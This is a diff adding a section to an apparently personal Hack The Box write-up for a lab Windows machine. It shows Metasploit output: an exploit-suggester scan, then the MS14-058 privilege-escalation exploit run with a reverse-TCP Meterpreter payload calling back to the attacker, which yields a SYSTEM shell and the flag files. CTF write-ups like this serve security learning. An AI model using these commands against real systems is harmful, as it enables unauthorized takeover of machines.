@@ -205,6 +205,103 @@ categories:
 
 <br>And we successfully migrated to NETWORK SERVICE and now we can run the local exploit suggester.
 
+<font size="1">
+<div style="height:200px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
+
+<p>meterpreter > background 
+<br><font color="RoyalBlue">[*]</font> Backgrounding session 1...
+<br>msf exploit(<font color="red">iis_webdav_scstoragepathfromurl</font>) > use post/multi/recon/local_exploit_suggester \r
+<br>msf post(<font color="red">local_exploit_suggester</font>) > set SESSION 1
+<br>SESSION => 1
+<br>msf post(<font color="red">local_exploit_suggester</font>) > exploit</p>
+
+<p><font color="RoyalBlue">[*]</font> 10.10.10.15 - Collecting local exploits for x86/windows...
+<br><font color="RoyalBlue">[*]</font> 10.10.10.15 - 37 exploit checks are being tried...
+<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
+<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
+<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+<br><font color="RoyalBlue">[*]</font> Post module execution completed
+<br>msf post(<font color="red">local_exploit_suggester</font>) ></p>
+</div>
+</font>
+
+<br>In Suggestion we got couple of exploits which we can use, lets'first try with the **ms14_058_track_popup_menu**
+
+<font size="1">
+<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
+
+<p>msf post(<font color="red">local_exploit_suggester</font>) > use exploit/windows/local/ms14_058_track_popup_menu 
+<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > show options </p>
+
+<p>Module options (exploit/windows/local/ms14_058_track_popup_menu):</p>
+
+<p>&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
+<br>&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
+<br>&nbsp;&nbsp;&nbsp;SESSION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The session to run this module on.</p>
 
 
+<p>Exploit target:</p>
+
+<p>&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
+<br>&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
+<br>&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Windows x86</p>
+
+
+<p>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set SESSION 1
+<br>SESSION => 1
+<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set payload windows/meterpreter/reverse_tcp
+<br>payload => windows/meterpreter/reverse_tcp
+<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set LHOST 10.10.*.*
+<br>LHOST => 10.10.*.*
+<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set LPORT 444
+<br>LPORT => 444
+<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > exploit </p>
+
+<p><font color="RoyalBlue">[*]</font> Started reverse TCP handler on 10.10.*.*:444 
+<br><font color="RoyalBlue">[*]</font> Launching notepad to host the exploit...
+<br><font color="53E100">[+]</font> Process 912 launched.
+<br><font color="RoyalBlue">[*]</font> Reflectively injecting the exploit DLL into 912...
+<br><font color="RoyalBlue">[*]</font> Injecting exploit into 912...
+<br><font color="RoyalBlue">[*]</font> Exploit injected. Injecting payload into 912...
+<br><font color="RoyalBlue">[*]</font> Payload injected. Executing exploit...
+<br><font color="RoyalBlue">[*]</font> Sending stage (957487 bytes) to 10.10.10.15
+<br><font color="53E100">[+]</font> Exploit finished, wait for (hopefully privileged) payload execution to complete.
+<br><font color="RoyalBlue">[*]</font> Meterpreter session 3 opened (10.10.*.*:444 -> 10.10.10.15:1031) at 2018-02-22 20:21:02 -0500</p>
+
+<p>meterpreter > getuid 
+<br>Server username: NT AUTHORITY\SYSTEM
+<br>meterpreter > shell\r
+<br>Process 1660 created.
+<br>Channel 1 created.
+<br>Microsoft Windows [Version 5.2.3790]
+<br>(C) Copyright 1985-2003 Microsoft Corp.</p>
+
+<p>c:\windows\system32\inetsrv>
+<br>..
+<br>..
+<br>C:\Documents and Settings\Lakis\Desktop>type user.txt
+<br>type user.txt
+<br><font color="53E100">********************************</font>
+<br>C:\Documents and Settings\Lakis\Desktop>
+<br>..
+<br>..
+<br>C:\Documents and Settings\Administrator\Desktop>type root.txt
+<br>type root.txt
+<br><font color="53E100">********************************</font>
+<br>C:\Documents and Settings\Administrator\Desktop></p>
+
+</div>
+</font>
+
+<p class="message">
+  ~ Hack the World and Stay Noob
+</p>
+
+[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
+[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)
+
+<script src="https://www.hackthebox.eu/badge/966"> </script>
 
